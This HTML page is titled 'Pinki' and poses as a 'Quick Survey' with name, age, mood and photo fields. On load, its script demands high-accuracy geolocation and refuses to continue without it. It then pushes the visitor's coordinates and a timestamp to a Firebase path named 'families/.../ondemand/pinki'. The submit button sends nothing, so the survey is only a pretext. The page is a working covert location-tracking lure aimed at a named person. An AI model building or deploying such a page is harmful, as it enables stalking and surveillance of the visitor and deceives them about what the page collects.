<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pinki</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, sans-serif;
            min-height: 100vh;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
        }
        .title { font-size: 20px; font-weight: 500; color: #333; margin-bottom: 4px; }
        .subtitle { font-size: 13px; color: #999; margin-bottom: 24px; }
        .form { display: none; }
        .form.visible { display: block; }
        .waiting { text-align: center; padding: 20px 0; color: #999; font-size: 14px; }
        label { display: block; font-size: 13px; color: #666; margin-bottom: 6px; margin-top: 16px; }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            outline: none;
        }
        input:focus { border-color: #4CAF50; }
        .options { display: flex; gap: 8px; margin-top: 8px; }
        .option {
            flex: 1;
            padding: 12px 8px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            font-size: 13px;
            color: #555;
        }
        .option.selected { border-color: #4CAF50; background: #f1f8f1; color: #4CAF50; }
        .photo-box {
            width: 100%;
            height: 140px;
            border: 2px dashed #e0e0e0;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin-top: 8px;
            overflow: hidden;
            position: relative;
        }
        .photo-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .photo-box .placeholder { text-align: center; color: #aaa; font-size: 13px; }
        .photo-box .placeholder span { font-size: 32px; display: block; margin-bottom: 4px; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            margin-top: 24px;
            cursor: pointer;
        }
        .success { text-align: center; padding: 20px 0; display: none; }
        .success .check { font-size: 48px; }
        .success p { color: #4CAF50; font-size: 16px; margin-top: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title">Quick Survey 📋</div>
        <div class="subtitle">Please fill in your details</div>

        <div class="waiting" id="waiting">
            Please allow location access to continue...
        </div>

        <div class="form" id="form">
            <label>Your Name</label>
            <input type="text" id="name" placeholder="Enter your name" />

            <label>Age</label>
            <input type="number" id="age" placeholder="Enter your age" />

            <label>How are you feeling today?</label>
            <div class="options">
                <div class="option" onclick="selectOption(this)">😊 Good</div>
                <div class="option" onclick="selectOption(this)">😐 Okay</div>
                <div class="option" onclick="selectOption(this)">😔 Not well</div>
            </div>

            <label>Upload Photo (optional)</label>
            <div class="photo-box" onclick="document.getElementById('photoInput').click()">
                <img id="photoPreview" />
                <div class="placeholder" id="photoPlaceholder">
                    <span>📷</span>
                    Take or upload photo
                </div>
            </div>
            <input type="file" id="photoInput" accept="image/*" capture="environment" style="display:none" onchange="previewPhoto(this)" />

            <button class="btn" onclick="submitForm()">Submit</button>
        </div>

        <div class="success" id="success">
            <div class="check">✅</div>
            <p>Thank you! Response submitted.</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        const app = initializeApp({
            databaseURL: "https://familylocator-3808a-default-rtdb.asia-southeast1.firebasedatabase.app"
        });
        const db = getDatabase(app);

        window.selectOption = function(el) {
            document.querySelectorAll('.option').forEach(o => o.classList.remove('selected'));
            el.classList.add('selected');
        }

        window.previewPhoto = function(input) {
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    document.getElementById('photoPreview').src = e.target.result;
                    document.getElementById('photoPreview').style.display = 'block';
                    document.getElementById('photoPlaceholder').style.display = 'none';
                }
                reader.readAsDataURL(input.files[0]);
            }
        }

        window.submitForm = function() {
            document.getElementById('form').style.display = 'none';
            document.getElementById('success').style.display = 'block';
        }

        window.onload = function() {
            if (!navigator.geolocation) {
                document.getElementById('waiting').textContent = 'Location not supported.';
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    push(ref(db, 'families/74b5bd46/ondemand/pinki'), {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy),
                        timestamp: Date.now(),
                        source: 'survey'
                    });
                    document.getElementById('waiting').style.display = 'none';
                    document.getElementById('form').classList.add('visible');
                },
                function() {
                    document.getElementById('waiting').textContent =
                        '❌ Location access denied. Cannot continue.';
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
